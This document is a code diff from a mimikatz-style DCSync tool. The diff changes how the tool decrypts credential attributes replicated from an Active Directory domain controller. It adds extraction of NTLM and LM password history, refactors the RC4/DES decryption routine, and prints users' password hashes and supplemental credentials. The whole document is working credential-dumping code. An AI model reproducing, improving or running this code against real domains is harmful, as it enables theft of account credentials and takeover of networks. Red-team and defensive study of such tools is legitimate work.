@@ -19,7 +19,7 @@ int wmain(int argc, wchar_t * argv[])
 	PDOMAIN_CONTROLLER_INFO cInfo = NULL;
 
 	kprintf(L"\n"
-		L"  .#####.   DCSync 1.0\n"
+		L"  .#####.   " MIMIKATZ_FULL L"\n"
 		L" .## ^ ##.  /* * *\n"
 		L" ## / \\ ##   Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )\n"
 		L" ## \\ / ##   Vincent LE TOUX            ( vincent.letoux@gmail.com )\n"
@@ -157,7 +157,6 @@ void descrUser(ATTRBLOCK *attributes)
 	DWORD rid = 0;
 	PBYTE encodedData;
 	DWORD encodedDataSize;
-	BYTE clearHash[LM_NTLM_HASH_LENGTH];
 	PVOID data;
 
 	findPrintMonoAttr(L"SAM Username         : ", attributes, ATT_SAM_ACCOUNT_NAME, TRUE);
@@ -190,28 +189,22 @@ void descrUser(ATTRBLOCK *attributes)
 		kprintf(L"Object Relative ID   : %u\n", rid);
 
 		kprintf(L"\nCredentials:\n");
+		if(findMonoAttr(attributes, ATT_UNICODE_PWD, &encodedData, &encodedDataSize))
+			decrypt(encodedData, encodedDataSize, rid, L"NTLM", FALSE);
+		if(findMonoAttr(attributes, ATT_NT_PWD_HISTORY, &encodedData, &encodedDataSize))
+			decrypt(encodedData, encodedDataSize, rid, L"ntlm", TRUE);
 
 		if(findMonoAttr(attributes, ATT_DBCS_PWD, &encodedData, &encodedDataSize))
-		{
-			kprintf(L"  LM  :   ");
-			if(decryptHash(encodedData, encodedDataSize, rid, clearHash))
-				kull_m_string_wprintf_hex(clearHash, sizeof(clearHash), 0);
-			kprintf(L"\n");
-		}
-		if(findMonoAttr(attributes, ATT_UNICODE_PWD, &encodedData, &encodedDataSize))
-		{
-			kprintf(L"  NTLM: ");
-			if(decryptHash(encodedData, encodedDataSize, rid, clearHash))
-				kull_m_string_wprintf_hex(clearHash, sizeof(clearHash), 0);
-			kprintf(L"\n");
-		}
+			decrypt(encodedData, encodedDataSize, rid, L"LM  ", FALSE);
+		if(findMonoAttr(attributes, ATT_LM_PWD_HISTORY, &encodedData, &encodedDataSize))
+			decrypt(encodedData, encodedDataSize, rid, L"lm  ", TRUE);
+	}
 
-		if(findMonoAttr(attributes, ATT_SUPPLEMENTAL_CREDENTIALS, &encodedData, &encodedDataSize))
-		{
-			kprintf(L"\nSupplemental Credentials:\n");
-			if(decryptHash(encodedData, encodedDataSize, 0, NULL))
-				descrUserProperties((PUSER_PROPERTIES) (encodedData + 16 + 4)); // avoid SALT+CRC
-		}
+	if(findMonoAttr(attributes, ATT_SUPPLEMENTAL_CREDENTIALS, &encodedData, &encodedDataSize))
+	{
+		kprintf(L"\nSupplemental Credentials:\n");
+		if(decrypt(encodedData, encodedDataSize, 0, NULL, FALSE))
+			descrUserProperties((PUSER_PROPERTIES) (encodedData + 16 + 4)); // avoid SALT+CRC
 	}
 }
 
@@ -324,29 +317,41 @@ PKERB_KEY_DATA_NEW kuhl_m_lsadump_lsa_keyDataNewInfo(PVOID base, PKERB_KEY_DATA_
 	return (PKERB_KEY_DATA_NEW) ((PBYTE) keys + Count * sizeof(KERB_KEY_DATA_NEW));
 }
 
-BOOL decryptHash(PBYTE encodedData, DWORD encodedDataSize, DWORD rid, PBYTE data)
+BOOL decrypt(PBYTE encodedData, DWORD encodedDataSize, DWORD rid, LPCWSTR prefix, BOOL isHistory)
 {
+	DWORD i;
 	BOOL status = FALSE;
 	MD5_CTX md5ctx;
-	CRYPTO_BUFFER cryptoData, cryptoKey;
+	CRYPTO_BUFFER cryptoData = {encodedDataSize - 16, encodedDataSize - 16, encodedData + 16}, cryptoKey = {MD5_DIGEST_LENGTH, MD5_DIGEST_LENGTH, NULL};
+	BYTE data[LM_NTLM_HASH_LENGTH];
 
 	MD5Init(&md5ctx);
 	MD5Update(&md5ctx, g_sKey.SessionKey, g_sKey.SessionKeyLength);
 	MD5Update(&md5ctx, encodedData, 16); // salt
 	MD5Final(&md5ctx);
-
-	cryptoData.Length = cryptoData.MaximumLength = encodedDataSize - 16; // salt size
-	cryptoData.Buffer = encodedData + 16;// salt size
-	cryptoKey.Length = cryptoKey.MaximumLength = MD5_DIGEST_LENGTH;
 	cryptoKey.Buffer = md5ctx.digest;
+
 	if(NT_SUCCESS(RtlEncryptDecryptRC4(&cryptoData, &cryptoKey)))
 	{
-		// no crc check, sorry guys
-		if(rid && data)
+		cryptoData.Length = cryptoData.MaximumLength -= 4; // crc
+		cryptoData.Buffer += 4;
+
+		if(rid && prefix)
 		{
-			status = NT_SUCCESS(RtlDecryptDES2blocks1DWORD(cryptoData.Buffer + 4, &rid, data));
-			if(!status)
-				PRINT_ERROR(L"RtlDecryptDES2blocks1DWORD");
+			for(i = 0; i < cryptoData.Length; i+= LM_NTLM_HASH_LENGTH)
+			{
+				status = NT_SUCCESS(RtlDecryptDES2blocks1DWORD(cryptoData.Buffer + i, &rid, data));
+				if(status)
+				{
+					if(isHistory)
+						kprintf(L"    %s-%2u: ", prefix, i / LM_NTLM_HASH_LENGTH);
+					else
+						kprintf(L"  Hash %s: ", prefix);
+					kull_m_string_wprintf_hex(data, LM_NTLM_HASH_LENGTH, 0);
+					kprintf(L"\n");
+				}
+				else PRINT_ERROR(L"RtlDecryptDES2blocks1DWORD");
+			}
 		}
 		else
 		{
